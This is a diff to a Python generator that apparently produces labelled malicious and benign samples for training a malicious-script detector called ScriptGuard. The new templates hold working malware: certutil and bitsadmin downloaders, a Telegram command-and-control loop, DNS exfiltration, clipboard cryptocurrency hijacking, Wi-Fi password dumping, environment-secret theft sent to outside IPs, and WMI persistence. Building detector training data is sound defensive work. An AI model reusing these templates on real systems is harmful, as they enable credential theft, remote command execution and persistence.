@@ -1,7 +1,13 @@
 """
-ScriptGuard Dataset Augmentation Generator v2.1
+ScriptGuard Dataset Augmentation Generator v2.2
 Generates diverse malicious and hard-benign samples targeting
 benchmark failure archetypes identified in evaluation.
+
+Improvements over v2.1:
+- 8 new malicious archetypes covering LOLBin/C2/exfil gap:
+    lolbin_downloader, telegram_c2, dns_exfil, ldap_recon,
+    clipboard_hijack, wifi_dumper, env_stealer, wmi_persistence
+- gen_version bumped to "2.2", source prefix augmentation_v22_*
 
 Improvements over v2.0:
 - maybe_add_junk_code() with 8 templates and parametric n
@@ -687,6 +693,343 @@ def {rnd_name()}(filepath: str, key: bytes) -> None:
     return with_junk(random.choice(variants))
 
 
+def gen_lolbin_downloader() -> str:
+    url = f"http://{rnd_ip()}/{rnd_name()}.exe"
+    out_file = rnd_name() + ".exe"
+    tmp_path = "C:\\\\Windows\\\\Temp\\\\" + out_file
+    task_name = random.choice(["WinUpdate", "SystemSync", "OneDriveHealth", "MsEdgeHelper"])
+    variants = [
+        f"""{maybe_add_comment()}
+import subprocess
+
+URL = '{url}'
+OUT = r'C:\\Windows\\Temp\\{out_file}'
+
+subprocess.run(['certutil', '-urlcache', '-split', '-f', URL, OUT], check=True)
+subprocess.Popen([OUT])""",
+
+        f"""import subprocess
+
+url = '{url}'
+out = r'C:\\Windows\\Temp\\{out_file}'
+subprocess.run(
+    ['bitsadmin', '/transfer', '{rnd_name()}', url, out],
+    capture_output=True
+)""",
+
+        f"""import subprocess, sys
+
+subprocess.run([
+    'schtasks', '/create', '/tn', '{task_name}',
+    '/tr', sys.executable, '/sc', 'ONLOGON', '/f'
+], capture_output=True)""",
+    ]
+    return with_junk(random.choice(variants))
+
+
+def gen_telegram_c2() -> str:
+    token = (
+        f"{random.randint(1000000000, 9999999999)}:"
+        + "".join(random.choices(string.ascii_letters + string.digits + "-_", k=35))
+    )
+    chat_id = str(random.randint(100000000, 999999999))
+    variants = [
+        (lambda fn_send, fn_poll: f"""{maybe_add_comment()}
+import requests, subprocess, time
+
+TOKEN = '{token}'
+CHAT_ID = '{chat_id}'
+API = 'https://api.telegram.org/bot' + TOKEN
+
+def {fn_send}(text):
+    requests.post(API + '/sendMessage', json={{'chat_id': CHAT_ID, 'text': text}})
+
+def {fn_poll}():
+    offset = 0
+    while True:
+        r = requests.get(API + '/getUpdates', params={{'offset': offset, 'timeout': 30}})
+        for upd in r.json().get('result', []):
+            offset = upd['update_id'] + 1
+            cmd = upd.get('message', {{}}).get('text', '')
+            if cmd:
+                out = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+                {fn_send}(out.stdout or out.stderr)
+        time.sleep(1)
+
+{fn_poll}()""")(rnd_name(), rnd_name()),
+
+        (lambda fn: f"""import requests, os, platform
+
+TOKEN = '{token}'
+CHAT = '{chat_id}'
+
+def {fn}():
+    info = 'HOST: ' + platform.node() + '\\nUSER: ' + (os.getenv('USERNAME') or os.getenv('USER', ''))
+    requests.post(
+        'https://api.telegram.org/bot' + TOKEN + '/sendMessage',
+        json={{'chat_id': CHAT, 'text': info}}
+    )
+
+{fn}()""")(rnd_name()),
+    ]
+    return with_junk(random.choice(variants))
+
+
+def gen_dns_exfil() -> str:
+    domain = f"{rnd_name(6)}.{rnd_name(4)}.com"
+    variants = [
+        (lambda fn: f"""{maybe_add_comment()}
+import socket, base64, os
+
+DOMAIN = '{domain}'
+
+def {fn}(data: str) -> None:
+    encoded = base64.b32encode(data.encode()).decode().lower().rstrip('=')
+    for i in range(0, len(encoded), 30):
+        chunk = encoded[i:i+30]
+        try:
+            socket.gethostbyname(chunk + '.' + DOMAIN)
+        except Exception:
+            pass
+
+{fn}(os.getenv('USERNAME', 'user') + ':' + os.getcwd())""")(rnd_name()),
+
+        (lambda fn: f"""import socket, time
+
+C2 = '{domain}'
+
+def {fn}(payload: bytes) -> None:
+    hex_data = payload.hex()
+    for i in range(0, len(hex_data), 32):
+        label = hex_data[i:i+32]
+        try:
+            socket.gethostbyname(label + '.' + C2)
+        except OSError:
+            pass
+        time.sleep(0.1)
+
+{fn}(b'exfil_data')""")(rnd_name()),
+    ]
+    return with_junk(random.choice(variants))
+
+
+def gen_ldap_recon() -> str:
+    dc = random.choice(["dc.company.local", "ldap.corp.int", "ad.internal.net"])
+    dc_stripped = dc.replace("dc.", "").replace("ldap.", "").replace("ad.", "")
+    base_dn = ",".join(f"DC={p}" for p in dc_stripped.split("."))
+    ip = rnd_ip()
+    port = rnd_port()
+    variants = [
+        (lambda fn: f"""{maybe_add_comment()}
+import ldap3, socket, json
+
+SERVER = '{dc}'
+BASE_DN = '{base_dn}'
+
+def {fn}() -> list:
+    srv = ldap3.Server(SERVER, get_info=ldap3.ALL)
+    conn = ldap3.Connection(srv, auto_bind=True)
+    conn.search(BASE_DN, '(objectClass=user)',
+                attributes=['sAMAccountName', 'mail', 'memberOf'])
+    users = [entry.entry_attributes_as_dict for entry in conn.entries]
+    conn.unbind()
+    return users
+
+data = {fn}()
+s = socket.socket()
+s.connect(('{ip}', {port}))
+s.send(json.dumps(data).encode())
+s.close()""")(rnd_name()),
+
+        f"""import ldap3, requests
+
+LDAP_SERVER = '{dc}'
+BASE = '{base_dn}'
+
+server = ldap3.Server(LDAP_SERVER)
+conn = ldap3.Connection(server, auto_bind=True)
+conn.search(BASE, '(sAMAccountName=*)', attributes=['sAMAccountName', 'description'])
+users = [str(e.sAMAccountName) for e in conn.entries]
+requests.post('http://{ip}:{port}/{rnd_name()}', json={{'users': users}})""",
+    ]
+    return with_junk(random.choice(variants))
+
+
+def gen_clipboard_hijack() -> str:
+    btc_addr = "1" + "".join(random.choices(string.ascii_uppercase + string.digits, k=33))
+    eth_addr = "0x" + "".join(random.choices("0123456789abcdef", k=40))
+    variants = [
+        (lambda fn: f"""{maybe_add_comment()}
+import pyperclip, re, time
+
+BTC_RE = re.compile(r'\\b[13][a-km-zA-HJ-NP-Z1-9]{{25,34}}\\b')
+ETH_RE = re.compile(r'\\b0x[0-9a-fA-F]{{40}}\\b')
+MY_BTC = '{btc_addr}'
+MY_ETH = '{eth_addr}'
+
+def {fn}() -> None:
+    while True:
+        cb = pyperclip.paste()
+        if BTC_RE.match(cb):
+            pyperclip.copy(MY_BTC)
+        elif ETH_RE.match(cb):
+            pyperclip.copy(MY_ETH)
+        time.sleep(0.5)
+
+{fn}()""")(rnd_name()),
+
+        (lambda fn: f"""import win32clipboard, re, time, threading
+
+MY_ADDR = '{btc_addr}'
+CRYPTO_RE = re.compile(r'(bc1|[13])[a-zA-HJ-NP-Z0-9]{{25,39}}')
+
+def {fn}():
+    while True:
+        try:
+            win32clipboard.OpenClipboard()
+            data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+        except Exception:
+            data = ''
+        if CRYPTO_RE.match(data.strip()):
+            win32clipboard.OpenClipboard()
+            win32clipboard.SetClipboardText(MY_ADDR)
+            win32clipboard.CloseClipboard()
+        time.sleep(0.3)
+
+threading.Thread(target={fn}, daemon=True).start()
+time.sleep(86400)""")(rnd_name()),
+    ]
+    return with_junk(random.choice(variants))
+
+
+def gen_wifi_dumper() -> str:
+    ip = rnd_ip()
+    port = rnd_port()
+    variants = [
+        (lambda fn: f"""{maybe_add_comment()}
+import subprocess, re, requests
+
+def {fn}() -> list:
+    out = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], text=True)
+    profiles = re.findall(r'All User Profile\\s*:\\s*(.+)', out)
+    results = []
+    for profile in profiles:
+        profile = profile.strip()
+        detail = subprocess.check_output(
+            ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], text=True
+        )
+        m = re.search(r'Key Content\\s*:\\s*(.+)', detail)
+        if m:
+            results.append({{'ssid': profile, 'password': m.group(1).strip()}})
+    return results
+
+data = {fn}()
+requests.post('http://{ip}:{port}/wifi', json=data)""")(rnd_name()),
+
+        f"""import subprocess, re, socket
+
+profiles_out = subprocess.run(
+    ['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True
+).stdout
+networks = re.findall(r'All User Profile\\s*:\\s*(.+)', profiles_out)
+creds = {{}}
+for net in networks:
+    net = net.strip()
+    detail = subprocess.run(
+        ['netsh', 'wlan', 'show', 'profile', net, 'key=clear'],
+        capture_output=True, text=True
+    ).stdout
+    m = re.search(r'Key Content\\s*:\\s*(.+)', detail)
+    if m:
+        creds[net] = m.group(1).strip()
+
+s = socket.socket()
+s.connect(('{ip}', {port}))
+s.send(str(creds).encode())
+s.close()""",
+    ]
+    return with_junk(random.choice(variants))
+
+
+def gen_env_stealer() -> str:
+    ip = rnd_ip()
+    port = rnd_port()
+    patterns = random.choice([
+        ["API_KEY", "SECRET", "TOKEN", "PASSWORD", "AWS_", "GITHUB_"],
+        ["KEY", "SECRET", "PASS", "TOKEN", "CREDENTIAL", "AZURE_"],
+        ["API", "SECRET", "AUTH", "PRIVATE", "ACCESS", "DATABASE"],
+    ])
+    variants = [
+        (lambda fn: f"""{maybe_add_comment()}
+import os, requests
+
+PATTERNS = {patterns}
+C2 = 'http://{ip}:{port}/env'
+
+def {fn}() -> dict:
+    return {{k: v for k, v in os.environ.items()
+             if any(p in k.upper() for p in PATTERNS)}}
+
+data = {fn}()
+if data:
+    requests.post(C2, json=data)""")(rnd_name()),
+
+        (lambda fn: f"""import os, socket, json
+
+KEYS = {patterns}
+
+def {fn}():
+    found = {{k: v for k, v in os.environ.items()
+              if any(p in k for p in KEYS)}}
+    payload = json.dumps(found).encode()
+    s = socket.socket()
+    s.connect(('{ip}', {port}))
+    s.send(payload)
+    s.close()
+
+{fn}()""")(rnd_name()),
+    ]
+    return with_junk(random.choice(variants))
+
+
+def gen_wmi_persistence() -> str:
+    script_name = rnd_name() + ".py"
+    filter_name = rnd_name()
+    consumer_name = rnd_name()
+    variants = [
+        (lambda fn: f"""{maybe_add_comment()}
+import win32com.client
+
+def {fn}(script_path: str) -> None:
+    wmi = win32com.client.GetObject('winmgmts:')
+    ef = wmi.Get('__EventFilter').SpawnInstance_()
+    ef.Name = '{filter_name}'
+    ef.EventNamespace = 'root\\\\cimv2'
+    ef.QueryLanguage = 'WQL'
+    ef.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second=5"
+    ef.Put_()
+    cons = wmi.Get('CommandLineEventConsumer').SpawnInstance_()
+    cons.Name = '{consumer_name}'
+    cons.CommandLineTemplate = 'python ' + script_path
+    cons.Put_()
+    bind = wmi.Get('__FilterToConsumerBinding').SpawnInstance_()
+    bind.Filter = ef.Path_
+    bind.Consumer = cons.Path_
+    bind.Put_()
+
+{fn}(r'C:\\Windows\\Temp\\{script_name}')""")(rnd_name()),
+
+        f"""import subprocess
+
+subprocess.run([
+    'wmic', 'process', 'call', 'create',
+    'cmd /c schtasks /create /tn {filter_name} /tr python.exe /sc ONSTART /f'
+], capture_output=True)""",
+    ]
+    return with_junk(random.choice(variants))
+
+
 # ==============================================================================
 # HARD BENIGN GENERATORS
 # ==============================================================================
@@ -865,6 +1208,15 @@ ARCHETYPES: dict[str, tuple[str, Callable]] = {
     "globals_exec":           ("malicious", gen_globals_exec),
     "data_exfil":             ("malicious", gen_data_exfil),
     "ransomware":             ("malicious", gen_ransomware),
+    # --- MALICIOUS v2.2 (LOLBin / C2 / exfil gap) ---
+    "lolbin_downloader":      ("malicious", gen_lolbin_downloader),
+    "telegram_c2":            ("malicious", gen_telegram_c2),
+    "dns_exfil":              ("malicious", gen_dns_exfil),
+    "ldap_recon":             ("malicious", gen_ldap_recon),
+    "clipboard_hijack":       ("malicious", gen_clipboard_hijack),
+    "wifi_dumper":            ("malicious", gen_wifi_dumper),
+    "env_stealer":            ("malicious", gen_env_stealer),
+    "wmi_persistence":        ("malicious", gen_wmi_persistence),
     # --- HARD BENIGN ---
     "hard_benign_devops":     ("benign", gen_hard_benign_devops),
     "hard_benign_cloud":      ("benign", gen_hard_benign_cloud),
@@ -900,10 +1252,10 @@ def generate_samples(n_per_arch: int, archetypes: list[str]) -> list[tuple]:
             seen.add(h)
             metadata = json.dumps({
                 "category": arch,
-                "gen_version": "2.1",
-                "batch": "augmentation_v21_benchmark_fix",
+                "gen_version": "2.2",
+                "batch": "augmentation_v22_lolbin_c2_fix",
             })
-            rows.append((h, content, label, f"augmentation_v21_{arch}", metadata))
+            rows.append((h, content, label, f"augmentation_v22_{arch}", metadata))
         print(f"    -> {len(seen)} unique samples ({attempts} attempts)")
     return rows
 
@@ -918,7 +1270,7 @@ def insert_to_db(rows: list[tuple]) -> int:
     with conn.cursor() as cur:
         execute_values(cur, query, rows)
     with conn.cursor() as cur:
-        cur.execute("SELECT COUNT(*) FROM public.samples WHERE source LIKE 'augmentation_v21%'")
+        cur.execute("SELECT COUNT(*) FROM public.samples WHERE source LIKE 'augmentation_v2%'")
         count = cur.fetchone()[0]
     conn.commit()
     conn.close()
@@ -930,7 +1282,7 @@ def insert_to_db(rows: list[tuple]) -> int:
 # ==============================================================================
 
 def main():
-    parser = argparse.ArgumentParser(description="ScriptGuard augmentation generator v2.1")
+    parser = argparse.ArgumentParser(description="ScriptGuard augmentation generator v2.2")
     parser.add_argument("--n", type=int, default=300, help="Samples per archetype (default: 300)")
     parser.add_argument("--arch", type=str, default=None, help="Single archetype (default: all)")
     parser.add_argument("--dry-run", action="store_true", help="Preview only, no DB insert")
@@ -955,7 +1307,7 @@ def main():
     ben_archs = len(archetypes) - mal_archs
 
     print(f"\n{'='*60}")
-    print(f"  ScriptGuard Augmentation Generator v2.1")
+    print(f"  ScriptGuard Augmentation Generator v2.2")
     print(f"  Archetypes : {len(archetypes)} ({mal_archs} malicious, {ben_archs} benign)")
     print(f"  Per arch   : {args.n}")
     print(f"  Total      : ~{total} samples")
@@ -972,12 +1324,12 @@ def main():
         print("\n[DRY RUN] First sample per archetype:\n")
         shown: set[str] = set()
         for r in rows:
-            arch = r[3].replace("augmentation_v21_", "")
+            arch = r[3].replace("augmentation_v22_", "").replace("augmentation_v21_", "")
             if arch not in shown:
                 shown.add(arch)
-                print(f"{'─'*50}")
+                print("-" * 50)
                 print(f"[{r[2]:9}] {arch}")
-                print(f"{'─'*50}")
+                print("-" * 50)
                 print(r[1][:400])
                 print()
         return
